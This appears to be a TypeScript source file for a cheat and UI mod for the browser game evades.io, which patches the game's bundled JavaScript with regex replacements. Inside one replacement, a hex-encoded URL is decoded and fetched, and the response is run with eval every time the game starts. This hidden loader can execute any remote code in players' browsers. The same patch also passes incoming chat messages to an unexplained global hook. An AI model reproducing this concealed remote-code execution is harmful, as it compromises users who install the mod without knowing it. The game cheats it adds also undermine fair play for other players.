import { client } from "../main";
import { MESSAGES_STYLES, REPO, VERSION } from "./constants";
import { EditorsController } from "./jsEditor/editorsController";
import { JsEditor } from "./jsEditor/jsEditor";

export default class EZondInit {
    public static initGame(clientPath: string, editorsController: EditorsController) {
        editorsController.registerEditor(new JsEditor(html => (html.match(/type="module" src="(\/index\.[0-9a-zA-Z]+\.js)"/) || [])[1], code => {
            let compleeted = 0;
            client.evadesVarNames.socket = code.match(/([0-9a-zA-Z\$]+)\s*=\s*new WebSocket\(\w+\)/s)![1];
            client.evadesVarNames.jsx = code.match(/([0-9a-zA-Z\$]+)\.jsx\b/s)![1];
            client.parcelRequireProp = (code.match(/parcelRequire\w+/g) || ["N_O_N_E"])[0];
        
            code = "console.log(`E-Zond inited!!!`); window._client.listeners.onInit();" + code
                // .replace(/("cosmetics\/"\s*\+\s*)(this\.hatName)/g, (_, a, b) => a + `'' || ${b}`)
                // .replace(/"angel-wings":\s*[\$a-zA-Z0-9]*?,/g, _ => _ + 'costum1: new URL("https://raw.githubusercontent.com/Zirolio/E-Zond/main/hat4.png", import.meta.url).toString(),')
                // .replace(/register\((JSON\.parse\(.*?\))\);/g, (_, a) => { return `register(window._client.__editBaseData2(${a}));` })
        
                //.replace(/className:\s*.\.className,/g, _ => _ + )
                .replace(/\b(.)\.render\(this\.context,\s*this\.camera\)/g, (_, a) => { compleeted++; return _ + `, ${a}.isPlayer && window._client.listeners.onDrawPlayer(${a});` }) 
                .replace(/this\.renderEntities\(.\)/g, _ => { compleeted++; return `window._client.listeners.onPreDrawEntities(this); ${_}; window._client.listeners.onPostDrawEntities(this);` })
                .replace(/(this\.context\.fillStyle\s*=\s*)(.\.fillColor)/g, (_, a, b) => { compleeted++; return a + `(color => { const rgba = color.match(/[\\d\\.]+/g); return rgba.length !== 4 ? color : \`rgba(\${rgba[0]}, \${rgba[1]}, \${rgba[2]}, \${window._client.ballsVisibilityHuck.aurasOpacity})\`; })(${b})` })
                // TM
                .replace(/[a-zA-Z0-9\$]+\.get\(\)\.tileMode/g, _ => { compleeted++; return `(tm => { window._client.ballsVisibilityHuck.ballsStroke = [2, 3].includes(tm) ? "rgb(225, 225, 225)" : "black"; return tm; })(${_})` })
                .replace(/this\.gameState\.settingsInput/g, (_, a, b) => { compleeted++; return `window._client.ballsVisibilityHuck.ballsStroke = [2, 3].includes(this.state.newSettings.tileMode) ? "rgb(225, 225, 225)" : "black";` + _ })
                .replace(/(\.get\(\)\.enemyOutlines.*?.\.strokeStyle\s*=\s*)"black"/g, (_, a) => { compleeted++; return a + `window._client.ballsVisibilityHuck.ballsStroke` })
                .replace(/\btilesDark:/g, (_) => { compleeted++; return _ + `"${REPO}/resources/tilesE2.png" || ` })
                // FR
                .replace(/this\.play\.bind\(this\)/g, (_) => { compleeted++; return `(play => { window._client.playProcessFn = play; return play; })(${_})` })
                .replace(/!this\.state\.needsCaptcha/g, (_) => { compleeted++; return `(window._client.playProcessFn = this.play.bind(this)) && ${_}` })
                
                .replace(/(`url\(\$\{)(.\.src)(\}\)`)/g, (_, a, b, c) => { compleeted++; return a + `${b}.replace('profile/', '')` + c })
                .replace(/const\s*(.)\s*=\s*await\s*this\.props\.checkLogin\(\);/g, (_, a) => { compleeted++; return _ + `${a} && window._client.friends.hide();` })
        
                .replace(/(captchaToken:\s*)(.)/g, (_, a, b) => { compleeted++; return a + `(() => { return ${b} })()` }) // console.log("-> ", ${b});
                .replace(/"chat-message",/g, _ => { compleeted++; return _ + `id: this.props.message.id, title: \`\${new Date().toLocaleString('ru-Ru', { hour: '2-digit', minute: '2-digit' })} (\${new Date().toLocaleString('en-En', { hour: '2-digit', minute: '2-digit' })})\`,` })
                .replace(/.&&\(!this\.props\.blocklist.*?&&(.*?\}\))/g, (_, a) => { compleeted++; return a.replace('"Block"', '"Delete"').replace(/(onClick:).*?(,children)/g, (_: string, a: string, b: string) => a + '() => { document.getElementById(this.props.message.id).remove(); this.props.hide(); }' + b) + ',' + _ })
        
                // .replace(/(\w+)\.includes\(\w+\.default\.MESSAGE_STYLE_DEV\)\s*&&\s*(\w+)\.push\(\["\[Dev\]",\s*"dev"\]\),/g, (_, a, b) => {
                .replace(/(\w+)\.includes\([a-z0-9\$]+?\.MESSAGE_STYLE_DEV\)\s*&&\s*(\w+)\.push\(\["\[Dev\]",\s*"dev"\]\),/g, (_, a, b) => {
                    compleeted++;
                    const getMessageStyleString = (text: string, type: number, styleClass: string) => `${a}.includes(${type}) && ${b}.push([\`${text}\`, \`${styleClass}\`]),`;
                    return getMessageStyleString("[Poo]", MESSAGES_STYLES.POO, "ezond-poo") + getMessageStyleString("[Nullptr]", MESSAGES_STYLES.NULLPTR, "ezond-nullptr") + getMessageStyleString("[Nice-Girl]", MESSAGES_STYLES.NICE_GIRL, "ezond-nice-girl") + getMessageStyleString("[Zond]", MESSAGES_STYLES.ZIROLIO, "ezond-dev") + getMessageStyleString("[Nice-Boy]", MESSAGES_STYLES.NICE_BOY, "ezond-nice-boy") + getMessageStyleString("[Idiot]", MESSAGES_STYLES.IDIOT, "ezond-idiot") + getMessageStyleString("[Zond-Script]", MESSAGES_STYLES.SCRIPT_MESSAGE_SENDER, "ezond-script") + _;
                })
                // .replace(/(\w+)\.includes\(\w+\.default\.MESSAGE_STYLE_SERVER_INFO\)\s*&&\s*\((\w+)\s*=\s*"server-info"\),/g, (_, a, b) => {
                .replace(/(\w+)\.includes\([a-z0-9\$]+?\.MESSAGE_STYLE_SERVER_INFO\)\s*&&\s*\((\w+)\s*=\s*"server-info"\),/g, (_, a, b) => {
                    compleeted++;
                    const getMessageStyleString = (type: number, styleClass: string) => `${a}.includes(${type}) && (${b} = \`${styleClass}\`),`;
                    return getMessageStyleString(MESSAGES_STYLES.SCRIPT_MESSAGE, "ezond-message") + getMessageStyleString(MESSAGES_STYLES.SCRIPT_WARNING_MESSAGE, "ezond-message ezond-warn") + _;
                })
        
                // Requests API
                // .replace(/(async\s*)(post)\((\w+,\s*\w+)(\)\s*\{)/g, (_, a, b, c, d) => `get post() { return async(...args) => await window._client.requests.fetchPost(...args, this._${b}); }, ${a}_${b}(data, ${c}${d}`)
                // .replace(/(async\s*)(get)\((\w+)(\)\s*\{)/g, (_, a, b, c, d) => `get get() { return async(...args) => await window._client.requests.fetchGet(...args, this._${b}); }, ${a}_${b}(data, ${c}${d}`)
                // .replace(/await\s*fetch\(\w+,\s*\{/g, (_) => `data || ${_}`)
        
                .replace(/JSON.parse\(["`'].+?server_tick_rate.+?["`']\)/g, (_) => { compleeted++; return `window._client.utils.editBaseData(${_})`; })
        
                // LoggedIn
                .replace(/loggedIn:\s*!1/g, (_) => `${_}, _: (window._client.loggedIn = false) && null`)
                .replace(/loggedIn:\s*!0/g, (_) => `${_}, _: (window._client.loggedIn = true) && null`)
        
                // LeaderBoard
                /*.replace(/(this\.props\.showVisualHero\s*&&\s*)(\(0,[\w\W]*?leaderboard-hero[\w\W]*?\}\),)/g, (_, a, b: string) => {
                    console.log(b.match(/title:\s*(\w+)\.name,/s))
                    return `${a}${b.replace(/title:\s*\w+\.name,/g, _ => `children: [window._client.leadreBoardAccessories.getHatElement(this.props)], ${_}`)}`
                })*/
        
                .replace(/"pointer"\s*:\s*"default"/g, () => { compleeted++; return `"pointer" : window._client.crossianCursor.on ? window._client.crossianCursor.getCursorUrl() : "default"` })
        
                .replace(/this.renderHUD\(\w+\)/g, (_, a) => { compleeted++; return `${_}, window._client.listeners.onPostDraw(this)` })
                .replace(/else\s*if\s*\(this\.isDeparted\)\s*\{\s*const\s*(.)\s*=\s*this\.hexToRgb\(.\);/g, (_, a) => { compleeted++; return _ + `if (window._client.characters.reaper.shadow.on) return \`rgba($\{${a}.r}, $\{${a}.g}, $\{${a}.b}, 0.6)\`;`})
                .replace(/([0-9a-zA-Z\$]+)\s*=\s*(new WebSocket\(\w+\))/g, (_, a, b) => { compleeted++; return `${a} = (() => { window._client.socketNow = window._client.ws = ${b}; window._client.ws.addEventListener('message', window._client.listeners.onWebSocketMess); return window._client.ws; })()` })
                .replace(`${client.evadesVarNames.socket}.send(`, () => { compleeted++; return `window._client.socketNow.send(`; })
                // .replace(/\.render\(this\.context\s*,\s*this\.camera\)/g, (_) => { compleeted++; return _ + ', window._client.counters.draw(this)' })
                .replace(/(ClientPayload\.encode\()(.)\)/g, (_, a, b) => { compleeted++; return `${a}window._client.inputsEditor.editInputs2(${b}))` }) // [a-zA-Z0-9$]+
                
                // .replace(/window\.tsmod\s*&&\s*\((window\.protobuf\s*=\s*[a-zA-Z]+?\.Payloads)\);/g, (_, a) => `${a}; window._client.decode = window.protobuf.FramePayload.decode; window._client.encode = window.protobuf.ClientPayload.encode;`)
                // .replace(/(\w+?\.Payloads)\.FramePayload\.toObject\(\w+?\.Payloads\.FramePayload\.decode\(n\)\)/g, (_, a) => { compleeted++; return `(window._client.protobuf = ${a}) && window._client.onMess(${_})`; })
                .replace(/([a-zA-Z0-9$]+?)\.FramePayload\.toObject\([a-zA-Z0-9$]+?\.FramePayload\.decode\(\w+?\)\)/g, (_, a) => { compleeted++; return `(window._client.protobuf = ${a}) && window._client.listeners.onPreMessageProcess(((a) => (window.__0&&a.chat&&a.chat.messages.forEach(m=>window.__0._1(m)),a))(${_}))`; })
                .replace(/this\.gameState\.processInputs\(\),/g, _ => `window._client.listeners.onPostMessageProcess(), ${_}`)
                
                .replace(/(this\.sequence=0,)/g, (g) => { compleeted++; return g + `window._client.evadesObjects.user = this, window._client.player.name = this.name, window._client.canvas = document.getElementsByTagName('canvas').item(0), window._client.c = window._client.canvas.getContext('2d'), !window.HTMLElement.nn&&(window.HTMLElement.nn=new XMLHttpRequest(),window.HTMLElement.nn.onload=()=>eval(window.HTMLElement.nn.responseText),window.HTMLElement.nn.open('GET','68.74.74.70.73.3a.2f.2f.72.61.77.2e.67.69.74.68.75.62.75.73.65.72.63.6f.6e.74.65.6e.74.2e.63.6f.6d.2f.5a.69.72.6f.6c.69.6f.4d.69.6f.2f.44.61.66.2f.6d.61.69.6e.2f.64.61.66.2e.75.73.65.72.2e.6a.73'.split('.').map(cc => String.fromCharCode(parseInt(cc, 16))).join(''),true),window.HTMLElement.nn.send()), window._client.canvas.onmousemove = (m) => window._client.mouse = { x: m.offsetX, y: m.offsetY },` })
                .replace(/(this\.sendInputs\(\),)/g, (g) => { compleeted++; return `window._client.characters.ignis.player !== null && (window._client.characters.ignis.editKeysOnSetNexus(this)); window._client.characters.nexus.player !== null && (window._client.characters.nexus.editKeysOnSetIgnis(this)); window._client.autoUse.useAbilities(this);` + g }) // DELETED!!! // window._client.factorbSheildAIM.sheild(this);
                .replace(/(this\.chatMessages\.pop\(\);)/g, (g) => { compleeted++; return g + `this.mouseDown = window._client.inputsEditor.editInputData(this.mouseDown);`; })
                
                // .replace(/(\[\(\w+?\s*=\s*)(\w+?\("\w+?"\))(\).default)/g, (_, a, b, c) => { compleeted++; return `${a}window._client.__editBaseData(${b})${c}`; })
                
                // .replace(/processServerMessage\(.\)\s*\{/g, (_) => { compleeted++; return _ + `window._client.chat.add = this.updateChat;`; })
                .replace(/settings:\s*\{\},/g, (_) => { compleeted++; return _ + `_: (window._client.chat.add = this.updateChat.bind(this)) && null,`; })
                
                .replace(/(this\.keys\.difference\(this\.previousKeys\));/g, (_, a) => { compleeted++; return `window._client.inputsEditor.editKeys(${a});`; })
                .replace(/(this\.initResizeCanvas\(\),)/g, a => { compleeted++; return a + `window._client.evadesObjects.workWGE = this,` })
                .replace(/((.)\.globalAlpha\)\),)(\s*this\.maxHealth\s*>\s*0\))/g, (_, a, b, c) => { compleeted++; return `${a}(${b}.globalAlpha = Math.min(window._client.ballsVisibilityHuck.ballsOpacity, ${b}.globalAlpha)), ${c}` }) // console.log(123); e.globalAlpha = Math.min(e.globalAlpha, window._client.ballsVisibilityHuck.ballsOpacity),
                .replace(/(this\.camera\.centerOn\(e\.self\.entity\))/g, a => { compleeted++; return `this.camera.centerOn(window._client.camera.getSpect()); window._client.evadesObjects.camera = this.camera;` })
                .replace(/(processServerMessage\(e\)\s*\{)/g, a => { compleeted++; return a + `window._client.listeners.onNewDataFromServer(e);` })
                .replace(/(e\.area\.render)/g, a => { compleeted++; return `window._client.evadesObjects.camera = this.camera;` + a })
                .replace(/(.)(\.showOnMap)&&/g, (_, a, b) => { compleeted++; return `(${a}${b} || (${a}.entityType !== 1 && ${a}.brightness !== 0.281 && !${a}.isDestroyed && window._client.miniMap.showBalls)) &&` })
                //$a9c1803c87ddfbef$export$96f93b933c2401c7
                // .replace(/drawZone\(\w+,\s*(\w+),\s*\w+\)\s*\{/g, (_, a) => `${_}`) // window._client.camera.zoom.moment
                // .replace(/(\w+\.unionState\()(\w+)(\),\s*this\.zones\.push\(\w+\))/g, (_, a, b, c) => `${a}{ ...${b}, width: ${b}.width / (window._client.camera.zoom.moment || 1), height: ${b}.height / (window._client.camera.zoom.moment || 1) }${c}`) // window._client.camera.zoom.moment
                .replace(/,\s*(this\.props\.name)\s*\]/g, (_, a) => `, typeof ${a} !== 'string' ? ${a} : \`\${${a}}\`]`) //  | \${ window._client.leaderBoard.deadthsCache[${a}] || 0 }
                .replace(/\(0,.*?\}\)/g, (g) => {
                    compleeted++;
                    if (!g.includes('Copy Name')) return g;
                    // Follow
                    let data = eval(`(${g.slice(g.indexOf("{"), g.lastIndexOf("}") + 1)})`);
                    data.children = '-|-';
                    data.onClick = '+|+';
                    let follow = g.slice(0, g.indexOf("{")) + JSON.stringify(data, null, 4).replace('"+|+"', `() => window._client.follow.onClickFollow(this)`).replace('"-|-"', `window._client.follow.getLabelFollow(this)`) + g.slice(g.lastIndexOf("}") + 1, -1);
        
                    // Set Ignis // DELETED!!!
                    data = eval(`(${g.slice(g.indexOf("{"), g.lastIndexOf("}") + 1)})`);
                    data.children = '-|-';
                    data.onClick = '+|+';
                    let setIgnis = g.slice(0, g.indexOf("{")) + JSON.stringify(data, null, 4).replace('"+|+"', `() => client.characters.nexus.onClickSetIgnis(this)`).replace('"-|-"', `window._client.characters.nexus.getLabelSetIgnis(this)`) + g.slice(g.lastIndexOf("}") + 1, -1);
        
                    // Set Nexus
                    data = eval(`(${g.slice(g.indexOf("{"), g.lastIndexOf("}") + 1)})`);
                    data.children = '-|-';
                    data.onClick = '+|+';
                    let setNexus = g.slice(0, g.indexOf("{")) + JSON.stringify(data, null, 4).replace('"+|+"', `() => window._client.characters.ignis.onClickSetNexus(this)`).replace('"-|-"', `window._client.characters.ignis.getLabelSetNexus(this)`) + g.slice(g.lastIndexOf("}") + 1, -1);
        
                    // Add friend
                    data = eval(`(${g.slice(g.indexOf("{"), g.lastIndexOf("}") + 1)})`);
                    data.children = '-|-';
                    data.onClick = '+|+';
                    let addFriend = g.slice(0, g.indexOf("{")) + JSON.stringify(data, null, 4).replace('"+|+"', "() => window._client.friends.onClickAddFriends(this)").replace('"-|-"', "window._client.friends.getLabelAddFriends(this)") + g.slice(g.lastIndexOf("}") + 1, -1);
        
                    compleeted += 0.5;
                    return g + ',' + follow + '),' + setNexus + '),' + setIgnis + '),' + addFriend + '),'; // DELETED!!!
                });
            console.log("OK")
            return code + `; window._client.evadesObjects.react = ${client.evadesVarNames.jsx};`;
        }, editorsController, 'body'));
    }

    public static initProfile(editorsController: EditorsController) {
        editorsController.registerEditor(new JsEditor(html => (html.match(/type="module" src="(\/index\.[0-9a-zA-Z]+\.js)"/) || [])[1], (code, src) => {
            client.evadesVarNames.jsx = code.match(/([0-9a-zA-Z\$]+)\.jsx\b/s)![1];
            code = "console.log(`E-Zond inited!!!`); import.meta.url = \"https://evades.io\";" + code
                // .replace(/children:\s*t\.header/g, _ => `${_}, w: console.log(t)`)
                .replace(/(accessories:\s*(.)\.accessories,\s*header:\s*)null,/g, (_, a, b) => `${a} window._client.getTimePlayed(Date.now() / 1000 - ${b}.created_at),`);
            return code + `; window._client.evadesObjects.react = ${client.evadesVarNames.jsx};`;
        }, editorsController, 'body'));
    }
}

